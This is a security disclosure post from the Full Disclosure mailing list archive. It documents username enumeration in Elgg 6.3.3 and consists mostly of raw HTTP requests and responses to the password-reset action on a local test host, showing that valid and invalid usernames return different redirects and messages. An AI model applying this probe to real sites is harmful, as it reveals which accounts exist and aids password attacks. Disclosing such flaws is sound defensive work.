---
title: Username Enumeration - elggv6.3.3
url: https://seclists.org/fulldisclosure/2026/Jan/30
source: Full Disclosure
date: 2026-01-29
fetch_date: 2026-01-30T04:04:26.126463
---

# Username Enumeration - elggv6.3.3

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](29)
[By Date](date.html#30)
![Next](/images/right-icon-16x16.png)

[![Previous](/images/left-icon-16x16.png)](29)
[By Thread](index.html#30)
![Next](/images/right-icon-16x16.png)

![](/shared/images/nst-icons.svg#search)

# Username Enumeration - elggv6.3.3

---

*From*: Andrey Stoykov <mwebsec () gmail com>
*Date*: Sat, 24 Jan 2026 18:04:50 +0000

---

```
# Exploit Title: Elgg - Username Enumeration
# Date: 1/2026
# Exploit Author: Andrey Stoykov
# Version: 6.3.3
# Tested on: Ubuntu 22.04
# Blog:
https://msecureltd.blogspot.com/2026/01/friday-fun-pentest-series-47-lack-of.html

// HTTP Request - Resetting Password - Valid User

POST /action/user/requestnewpassword HTTP/1.1
Host: elgg.local
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:148.0)
Gecko/20100101 Firefox/148.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-GB,en;q=0.9
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 71
Origin: http://elgg.local
Sec-GPC: 1
Connection: keep-alive
Referer: http://elgg.local/forgotpassword
Cookie: Elgg=3v9mqlh8vai2f9hemfo7iqttt6
Upgrade-Insecure-Requests: 1
Priority: u=0, i

__elgg_token=2Cpt0GyVW9swhLkm5PggkQ&__elgg_ts=1769264047&username=admin

// HTTP Response - Resetting Password - Valid User

HTTP/1.1 302 Found
Date: Sat, 24 Jan 2026 14:14:43 GMT
Server: Apache/2.4.52 (Ubuntu)
Cache-Control: must-revalidate, no-cache, no-store, private
expires: Thu, 19 Nov 1981 08:52:00 GMT
pragma: no-cache
Location: http://elgg.local/
Vary: User-Agent
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=utf-8
Content-Length: 318

<!DOCTYPE html>
<html>
    <head>
        <meta charset="UTF-8" />
        <meta http-equiv="refresh" content="0;url='http://elgg.local/'"; />

        <title>Redirecting to http://elgg.local/</title>
    </head>
    <body>
        Redirecting to <a href="http://elgg.local/";>http://elgg.local/</a>.
    </body>
</html>

// HTTP Request - Following Redirection - Valid User

GET / HTTP/1.1
Host: elgg.local
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:148.0)
Gecko/20100101 Firefox/148.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-GB,en;q=0.9
Accept-Encoding: gzip, deflate, br
Origin: http://elgg.local
Sec-GPC: 1
Connection: keep-alive
Referer: http://elgg.local/action/user/requestnewpassword
Cookie: Elgg=3v9mqlh8vai2f9hemfo7iqttt6
Upgrade-Insecure-Requests: 1
Priority: u=0, i

// HTTP Response - Following Redirection - Valid User

HTTP/1.1 200 OK
Date: Sat, 24 Jan 2026 14:14:46 GMT
Server: Apache/2.4.52 (Ubuntu)
Cache-Control: must-revalidate, no-cache, no-store, private
x-frame-options: SAMEORIGIN
expires: Thu, 19 Nov 1981 08:52:00 GMT
pragma: no-cache
x-content-type-options: nosniff
Vary: Accept-Encoding,User-Agent
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=utf-8
Content-Length: 20646

[...]
<div class="elgg-message elgg-message-success"><div class="elgg-inner"><div
class="elgg-body">Successfully requested a new password, email
sent</div></div></div>
[...]

// HTTP Request - Resetting Password - Invalid User

POST /action/user/requestnewpassword HTTP/1.1
Host: elgg.local
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:148.0)
Gecko/20100101 Firefox/148.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-GB,en;q=0.9
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 67
Origin: http://elgg.local
Sec-GPC: 1
Connection: keep-alive
Referer: http://elgg.local/forgotpassword
Cookie: Elgg=3v9mqlh8vai2f9hemfo7iqttt6
Upgrade-Insecure-Requests: 1
Priority: u=0, i

__elgg_token=2Cpt0GyVW9swhLkm5PggkQ&__elgg_ts=1769264047&username=x

// HTTP Response - Resetting Password - Invalid User

HTTP/1.1 302 Found
Date: Sat, 24 Jan 2026 14:15:07 GMT
Server: Apache/2.4.52 (Ubuntu)
Cache-Control: must-revalidate, no-cache, no-store, private
expires: Thu, 19 Nov 1981 08:52:00 GMT
pragma: no-cache
Location: http://elgg.local/forgotpassword
Vary: User-Agent
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=utf-8
Content-Length: 374

<!DOCTYPE html>
<html>
    <head>
        <meta charset="UTF-8" />
        <meta http-equiv="refresh" content="0;url='
http://elgg.local/forgotpassword'"; />

        <title>Redirecting to http://elgg.local/forgotpassword</title>
    </head>
    <body>
        Redirecting to <a href="http://elgg.local/forgotpassword";>
http://elgg.local/forgotpassword</a>.
    </body>
</html>

// HTTP Request - Following Redirection - Invalid User

GET /forgotpassword HTTP/1.1
Host: elgg.local
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:148.0)
Gecko/20100101 Firefox/148.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-GB,en;q=0.9
Accept-Encoding: gzip, deflate, br
Origin: http://elgg.local
Sec-GPC: 1
Connection: keep-alive
Referer: http://elgg.local/action/user/requestnewpassword
Cookie: Elgg=3v9mqlh8vai2f9hemfo7iqttt6
Upgrade-Insecure-Requests: 1
Priority: u=0, i

// HTTP Response - Following Redirection - Invalid User

HTTP/1.1 200 OK
Date: Sat, 24 Jan 2026 14:15:09 GMT
Server: Apache/2.4.52 (Ubuntu)
Cache-Control: must-revalidate, no-cache, no-store, private
x-frame-options: SAMEORIGIN
expires: Thu, 19 Nov 1981 08:52:00 GMT
pragma: no-cache
x-content-type-options: nosniff
Vary: Accept-Encoding,User-Agent
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=utf-8
Content-Length: 19681

[...]
<div class="elgg-message elgg-message-error"><div class="elgg-inner"><div
class="elgg-body">Username x not found.</div></div></div>
[...]
_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: https://seclists.org/fulldisclosure/
```

---

[![Previous](/images/left-icon-16x16.png)](29)
[By Date](date.html#30)
![Next](/images/right-icon-16x16.png)

[![Previous](/images/left-icon-16x16.png)](29)
[By Thread](index.html#30)
![Next](/images/right-icon-16x16.png)

### Current thread:

* **Username Enumeration - elggv6.3.3** *Andrey Stoykov (Jan 29)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploit...